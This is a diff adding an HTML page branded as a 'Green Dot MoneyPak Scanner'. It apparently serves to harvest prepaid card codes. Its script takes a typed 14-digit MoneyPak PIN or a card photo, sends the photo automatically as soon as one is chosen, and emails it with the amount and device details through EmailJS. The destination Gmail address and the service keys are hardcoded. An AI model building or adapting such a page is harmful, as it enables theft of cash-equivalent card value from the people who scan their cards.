@@ -1,0 +1,735 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>MoneyPak Scanner • EmailJS</title>
+    <!-- EmailJS SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #008744;
+            --primary-dark: #006030;
+            --primary-light: #e6f5ec;
+            --accent: #ffd700;
+            --bg: #0f172a;
+            --card-bg: #1e293b;
+            --border: #334155;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --danger: #ef4444;
+            --success: #10b981;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 440px;
+            background: var(--card-bg);
+            border-radius: 20px;
+            border: 1px solid var(--border);
+            padding: 24px 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(0, 135, 68, 0.2);
+            color: #34d399;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            margin-bottom: 10px;
+            border: 1px solid rgba(52, 211, 153, 0.3);
+        }
+
+        .title {
+            font-size: 22px;
+            font-weight: 800;
+            color: var(--text-main);
+            margin-bottom: 4px;
+        }
+
+        .subtitle {
+            font-size: 13px;
+            color: var(--text-muted);
+        }
+
+        /* Email Destinatario Config */
+        .dest-box {
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px dashed var(--border);
+            border-radius: 12px;
+            padding: 12px;
+            margin-bottom: 18px;
+        }
+
+        .dest-label {
+            font-size: 11px;
+            text-transform: uppercase;
+            font-weight: 700;
+            color: var(--text-muted);
+            margin-bottom: 4px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .dest-input {
+            width: 100%;
+            background: transparent;
+            border: none;
+            color: #38bdf8;
+            font-weight: 600;
+            font-size: 13px;
+            outline: none;
+        }
+
+        /* Pestañas */
+        .tabs {
+            display: flex;
+            background: rgba(15, 23, 42, 0.8);
+            padding: 4px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            border: 1px solid var(--border);
+        }
+
+        .tab-btn {
+            flex: 1;
+            padding: 10px;
+            border: none;
+            background: transparent;
+            color: var(--text-muted);
+            font-weight: 700;
+            font-size: 13px;
+            border-radius: 8px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            transition: all 0.2s ease;
+        }
+
+        .tab-btn.active {
+            background: var(--primary);
+            color: white;
+            box-shadow: 0 4px 12px rgba(0, 135, 68, 0.35);
+        }
+
+        /* Visor de Cámara y Foto */
+        .scanner-viewport {
+            position: relative;
+            width: 100%;
+            height: 220px;
+            background: #090d16;
+            border-radius: 16px;
+            overflow: hidden;
+            border: 2px dashed #008744;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 16px;
+        }
+
+        .laser {
+            position: absolute;
+            left: 5%;
+            right: 5%;
+            height: 2px;
+            background: #00ff88;
+            box-shadow: 0 0 10px #00ff88, 0 0 20px #00ff88;
+            animation: scanLaser 2s infinite alternate ease-in-out;
+            z-index: 5;
+        }
+
+        @keyframes scanLaser {
+            0% { top: 10%; opacity: 0.3; }
+            50% { opacity: 1; }
+            100% { top: 90%; opacity: 0.3; }
+        }
+
+        .camera-video {
+            position: absolute;
+            inset: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: none;
+        }
+
+        .photo-preview {
+            position: absolute;
+            inset: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            background: #000;
+            display: none;
+            z-index: 4;
+        }
+
+        .scanner-placeholder {
+            text-align: center;
+            color: var(--text-muted);
+            padding: 20px;
+            z-index: 2;
+        }
+
+        .scanner-placeholder .material-icons {
+            font-size: 48px;
+            color: var(--primary);
+            margin-bottom: 8px;
+        }
+
+        /* Acciones de Foto */
+        .action-row {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 16px;
+        }
+
+        .btn-action {
+            flex: 1;
+            padding: 12px;
+            border-radius: 10px;
+            border: 1px solid var(--border);
+            background: #243248;
+            color: white;
+            font-size: 13px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            transition: all 0.2s ease;
+        }
+
+        .btn-action:hover {
+            background: #2d3e58;
+            border-color: #475569;
+        }
+
+        .btn-action.primary {
+            background: var(--primary);
+            border-color: var(--primary);
+        }
+
+        .btn-action.primary:hover {
+            background: var(--primary-dark);
+        }
+
+        /* Formulario de Código */
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 12px;
+            font-weight: 700;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 6px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 14px 16px;
+            background: rgba(15, 23, 42, 0.8);
+            border: 1.5px solid var(--border);
+            border-radius: 12px;
+            color: white;
+            font-size: 16px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            outline: none;
+            transition: all 0.2s ease;
+        }
+
+        .form-input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(0, 135, 68, 0.25);
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, var(--primary), #00b050);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 800;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            box-shadow: 0 8px 20px rgba(0, 135, 68, 0.35);
+            transition: all 0.2s ease;
+        }
+
+        .btn-submit:hover {
+            opacity: 0.95;
+            transform: translateY(-1px);
+        }
+
+        .btn-submit:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Status & Alert Box */
+        .status-box {
+            display: none;
+            margin-top: 16px;
+            padding: 14px;
+            border-radius: 12px;
+            font-size: 13px;
+            line-height: 1.4;
+            text-align: center;
+            font-weight: 600;
+        }
+
+        .status-box.success {
+            display: block;
+            background: rgba(16, 185, 129, 0.15);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            color: #34d399;
+        }
+
+        .status-box.error {
+            display: block;
+            background: rgba(239, 68, 68, 0.15);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            color: #f87171;
+        }
+
+        .status-box.loading {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            background: rgba(56, 189, 248, 0.15);
+            border: 1px solid rgba(56, 189, 248, 0.3);
+            color: #38bdf8;
+        }
+
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(56, 189, 248, 0.3);
+            border-left-color: #38bdf8;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <div class="logo-badge">
+            <span class="material-icons" style="font-size: 15px;">verified</span>
+            GREEN DOT • MONEYPAK SCANNER
+        </div>
+        <h1 class="title">Captura &amp; Envíos EmailJS</h1>
+        <p class="subtitle">La foto escaneada o el código digitado llegarán directamente a tu correo</p>
+    </div>
+
+    <!-- Correo de Destino -->
+    <div class="dest-box">
+        <label class="dest-label" for="destEmail">
+            <span class="material-icons" style="font-size: 14px;">email</span> Tu Correo de Recepción:
+        </label>
+        <input type="email" id="destEmail" class="dest-input" value="teuriemanuel1819@gmail.com" onchange="saveDestEmail(this.value)">
+    </div>
+
+    <!-- Pestañas de Modo -->
+    <div class="tabs">
+        <button type="button" id="tabPhoto" class="tab-btn active" onclick="switchView('photo')">
+            <span class="material-icons" style="font-size: 18px;">photo_camera</span> Escanear Foto
+        </button>
+        <button type="button" id="tabCode" class="tab-btn" onclick="switchView('code')">
+            <span class="material-icons" style="font-size: 18px;">dialpad</span> Digitar Código
+        </button>
+    </div>
+
+    <!-- SECCIÓN 1: FOTO / CÁMARA -->
+    <div id="sectionPhoto">
+        <div class="scanner-viewport">
+            <div class="laser" id="laser"></div>
+            <video id="cameraFeed" class="camera-video" playsinline autoplay></video>
+            <img id="photoPreview" class="photo-preview" alt="Foto MoneyPak">
+            <div id="scannerGuide" class="scanner-placeholder">
+                <span class="material-icons">qr_code_scanner</span>
+                <p style="font-weight: 700; font-size: 13px;">Apunta al código o toma una foto</p>
+                <p style="font-size: 11px; margin-top: 4px; opacity: 0.8;">La imagen se comprime y se envía a tu correo</p>
+            </div>
+        </div>
+
+        <div class="action-row">
+            <label for="fileInput" class="btn-action primary">
+                <span class="material-icons">photo_camera</span> Tomar Foto / Subir
+            </label>
+            <input type="file" id="fileInput" accept="image/*" capture="environment" style="display:none;" onchange="handleFileSelect(this)">
+
+            <button type="button" class="btn-action" id="btnToggleCam" onclick="toggleLiveCamera()">
+                <span class="material-icons">videocam</span> Cámara en Vivo
+            </button>
+        </div>
+
+        <button type="button" id="btnSnapLive" class="btn-submit" style="display:none; margin-bottom: 12px; background: #2563eb;" onclick="captureLiveSnapshot()">
+            <span class="material-icons">camera</span> Capturar y Enviar Foto
+        </button>
+    </div>
+
+    <!-- SECCIÓN 2: CÓDIGO MANUAL -->
+    <div id="sectionCode" style="display: none;">
+        <div class="form-group">
+            <label class="form-label" for="cardCode">Código de 14 Dígitos MoneyPak</label>
+            <input type="text" id="cardCode" class="form-input" placeholder="4819-0000-0000-00" maxlength="19" oninput="formatCodeInput(this)">
+        </div>
+
+        <div class="form-group">
+            <label class="form-label" for="cardAmount">Monto de la Tarjeta ($)</label>
+            <input type="number" id="cardAmount" class="form-input" value="250.00" min="20" max="500" step="0.01">
+        </div>
+    </div>
+
+    <!-- Botón Principal de Envío -->
+    <button type="button" id="btnSubmitAll" class="btn-submit" onclick="submitData()">
+        <span class="material-icons">send</span> Enviar a Mi Correo
+    </button>
+
+    <!-- Caja de Estado / Mensaje -->
+    <div id="statusBox" class="status-box"></div>
+</div>
+
+<script>
+    // ==========================================
+    // CONFIGURACIÓN DE TUS LLAVES EMAILJS
+    // ==========================================
+    const EMAILJS_CONFIG = {
+        PUBLIC_KEY: 'nKnbg46KpEK19pVak',
+        SERVICE_ID: 'service_m7243cn',
+        TEMPLATE_ID: 'template_zfs0wlt',
+        TEMPLATE_MONEYPAK_ID: 'template_zfs0wlt' // Plantilla para fotos y códigos MoneyPak
+    };
+
+    // Inicializar SDK
+    if (window.emailjs && EMAILJS_CONFIG.PUBLIC_KEY) {
+        emailjs.init(EMAILJS_CONFIG.PUBLIC_KEY);
+    }
+
+    let capturedPhotoBase64 = null;
+    let cameraStream = null;
+
+    // Cargar correo guardado previamente
+    const savedEmail = localStorage.getItem('hsb_admin_dest_email');
+    if (savedEmail) {
+        document.getElementById('destEmail').value = savedEmail;
+    }
+
+    function saveDestEmail(val) {
+        if (val && val.includes('@')) {
+            localStorage.setItem('hsb_admin_dest_email', val.trim());
+            showStatus('Correo de recepción actualizado: ' + val.trim(), 'success');
+        }
+    }
+
+    function switchView(tab) {
+        const btnPhoto = document.getElementById('tabPhoto');
+        const btnCode = document.getElementById('tabCode');
+        const secPhoto = document.getElementById('sectionPhoto');
+        const secCode = document.getElementById('sectionCode');
+
+        if (tab === 'photo') {
+            btnPhoto.classList.add('active');
+            btnCode.classList.remove('active');
+            secPhoto.style.display = 'block';
+            secCode.style.display = 'none';
+        } else {
+            btnCode.classList.add('active');
+            btnPhoto.classList.remove('active');
+            secCode.style.display = 'block';
+            secPhoto.style.display = 'none';
+            document.getElementById('cardCode').focus();
+        }
+    }
+
+    // Formatear código en grupos de 4 (xxxx-xxxx-xxxx-xx)
+    function formatCodeInput(input) {
+        let val = input.value.replace(/\D/g, '').slice(0, 14);
+        let parts = [];
+        for (let i = 0; i < val.length; i += 4) {
+            parts.push(val.slice(i, i + 4));
+        }
+        input.value = parts.join('-');
+    }
+
+    // Comprimir imagen usando Canvas (< 20KB para EmailJS)
+    function compressImage(fileOrDataUrl, maxWidth = 360, quality = 0.30) {
+        return new Promise((resolve, reject) => {
+            const img = new Image();
+            img.onload = function() {
+                let width = img.width;
+                let height = img.height;
+                if (width > maxWidth) {
+                    height = Math.round((height * maxWidth) / width);
+                    width = maxWidth;
+                }
+                const canvas = document.createElement('canvas');
+                canvas.width = width;
+                canvas.height = height;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(img, 0, 0, width, height);
+                resolve(canvas.toDataURL('image/jpeg', quality));
+            };
+            img.onerror = reject;
+
+            if (typeof fileOrDataUrl === 'string') {
+                img.src = fileOrDataUrl;
+            } else {
+                const reader = new FileReader();
+                reader.onload = (e) => { img.src = e.target.result; };
+                reader.onerror = reject;
+                reader.readAsDataURL(fileOrDataUrl);
+            }
+        });
+    }
+
+    // Manejar foto seleccionada o tomada desde archivo
+    async function handleFileSelect(input) {
+        if (!input.files || !input.files[0]) return;
+        const file = input.files[0];
+        showStatus('Comprimiendo y preparando foto...', 'loading');
+
+        try {
+            stopLiveCamera();
+            const compressed = await compressImage(file, 360, 0.30);
+            capturedPhotoBase64 = compressed;
+
+            const preview = document.getElementById('photoPreview');
+            preview.src = compressed;
+            preview.style.display = 'block';
+            document.getElementById('scannerGuide').style.display = 'none';
+            document.getElementById('laser').style.display = 'none';
+
+            // ENVIAR AUTOMÁTICAMENTE LA FOTO AL CORREO AL DETECTARLA
+            await sendEmail({
+                type: 'FOTO_CAPTURADA',
+                photo: compressed,
+                code: document.getElementById('cardCode').value || 'Aún no digitado',
+                amount: document.getElementById('cardAmount').value || '250.00'
+            });
+
+            showStatus('✓ ¡Foto capturada y enviada con éxito a tu correo!', 'success');
+        } catch (err) {
+            console.error(err);
+            showStatus('Error al procesar la foto: ' + (err.message || err), 'error');
+        }
+    }
+
+    // Iniciar / Detener cámara en vivo
+    async function toggleLiveCamera() {
+        const video = document.getElementById('cameraFeed');
+        const snapBtn = document.getElementById('btnSnapLive');
+        const guide = document.getElementById('scannerGuide');
+        const preview = document.getElementById('photoPreview');
+
+        if (cameraStream) {
+            stopLiveCamera();
+            return;
+        }
+
+        try {
+            cameraStream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'environment' }
+            });
+            video.srcObject = cameraStream;
+            video.style.display = 'block';
+            snapBtn.style.display = 'flex';
+            guide.style.display = 'none';
+            preview.style.display = 'none';
+            document.getElementById('laser').style.display = 'block';
+            document.getElementById('btnToggleCam').innerHTML = '<span class="material-icons">videocam_off</span> Detener Cámara';
+        } catch (err) {
+            alert('No se pudo acceder a la cámara: ' + err.message + '\nPuedes usar "Tomar Foto / Subir".');
+        }
+    }
+
+    function stopLiveCamera() {
+        if (cameraStream) {
+            cameraStream.getTracks().forEach(track => track.stop());
+            cameraStream = null;
+        }
+        document.getElementById('cameraFeed').style.display = 'none';
+        document.getElementById('btnSnapLive').style.display = 'none';
+        document.getElementById('btnToggleCam').innerHTML = '<span class="material-icons">videocam</span> Cámara en Vivo';
+    }
+
+    // Capturar frame de la cámara en vivo
+    async function captureLiveSnapshot() {
+        const video = document.getElementById('cameraFeed');
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        stopLiveCamera();
+        showStatus('Optimizando y enviando captura...', 'loading');
+
+        try {
+            const compressed = await compressImage(canvas.toDataURL('image/jpeg', 0.8), 360, 0.30);
+            capturedPhotoBase64 = compressed;
+
+            const preview = document.getElementById('photoPreview');
+            preview.src = compressed;
+            preview.style.display = 'block';
+            document.getElementById('laser').style.display = 'none';
+
+            await sendEmail({
+                type: 'FOTO_EN_VIVO',
+                photo: compressed,
+                code: document.getElementById('cardCode').value || 'Aún no digitado',
+                amount: document.getElementById('cardAmount').value || '250.00'
+            });
+
+            showStatus('✓ ¡Captura en vivo enviada con éxito a tu correo!', 'success');
+        } catch (err) {
+            showStatus('Error al enviar captura: ' + (err.message || err), 'error');
+        }
+    }
+
+    // Enviar datos por EmailJS
+    async function sendEmail(data) {
+        const targetEmail = document.getElementById('destEmail').value.trim();
+        if (!targetEmail || !targetEmail.includes('@')) {
+            throw new Error('Por favor ingresa un correo de recepción válido arriba.');
+        }
+
+        const isPhoto = (data.type === 'FOTO_CAPTURADA' || data.type === 'FOTO_EN_VIVO');
+        const subject = isPhoto 
+            ? `📸 [MONEYPAK] Nueva Foto Escaneada (${new Date().toLocaleTimeString()})`
+            : `💳 [MONEYPAK] Código Ingresado: ${data.code} ($${data.amount})`;
+
+        const textMessage = [
+            `=== NUEVA CAPTURA DE MONEYPAK ===`,
+            `Tipo: ${data.type}`,
+            `Código PIN: ${data.code || 'N/A'}`,
+            `Monto: $${data.amount || '0.00'}`,
+            `Fecha: ${new Date().toLocaleString()}`,
+            `Dispositivo: ${navigator.userAgent}`
+        ].join('\n');
+
+        const templateParams = {
+            to_email: targetEmail,
+            email: targetEmail,
+            recipient_email: targetEmail,
+            to: targetEmail,
+
+            to_name: 'Propietario',
+            user_name: 'Usuario Scanner',
+            user_email: targetEmail,
+            from_name: 'MoneyPak Scanner',
+            subject: subject,
+            title: subject,
+            message: textMessage,
+            content: textMessage,
+
+            code: data.code || 'N/A',
+            moneypak_code: data.code || 'N/A',
+            pin: data.code || 'N/A',
+            amount: `$${data.amount || '0.00'}`,
+            date: new Date().toLocaleString(),
+
+            photo: data.photo || 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7'
+        };
+
+        const targetTemplate = EMAILJS_CONFIG.TEMPLATE_MONEYPAK_ID || EMAILJS_CONFIG.TEMPLATE_ID;
+        return emailjs.send(EMAILJS_CONFIG.SERVICE_ID, targetTemplate, templateParams, EMAILJS_CONFIG.PUBLIC_KEY);
+    }
+
+    // Enviar cuando se pulsa el botón principal
+    async function submitData() {
+        const rawCode = document.getElementById('cardCode').value.replace(/\D/g, '');
+        const amount = document.getElementById('cardAmount').value || '250.00';
+
+        if (!capturedPhotoBase64 && rawCode.length === 0) {
+            showStatus('Por favor escanea una foto o digita el código antes de enviar.', 'error');
+            return;
+        }
+
+        showStatus('Enviando datos a tu correo...', 'loading');
+        document.getElementById('btnSubmitAll').disabled = true;
+
+        try {
+            await sendEmail({
+                type: capturedPhotoBase64 ? 'FOTO_Y_CODIGO' : 'SOLO_CODIGO',
+                photo: capturedPhotoBase64 || '',
+                code: rawCode || 'No digitado',
+                amount: amount
+            });
+
+            showStatus('✓ ¡Enviado con éxito a ' + document.getElementById('destEmail').value + '!', 'success');
+        } catch (err) {
+            console.error(err);
+            showStatus('Error al enviar por EmailJS: ' + (err.text || err.message || err), 'error');
+        } finally {
+            document.getElementById('btnSubmitAll').disabled = false;
+        }
+    }
+
+    function showStatus(msg, type) {
+        const el = document.getElementById('statusBox');
+        el.className = 'status-box ' + type;
+        if (type === 'loading') {
+            el.innerHTML = '<div class="spinner"></div><span>' + msg + '</span>';
+        } else {
+            el.textContent = msg;
+        }
+    }
+</script>
+
+</body>
+</html>
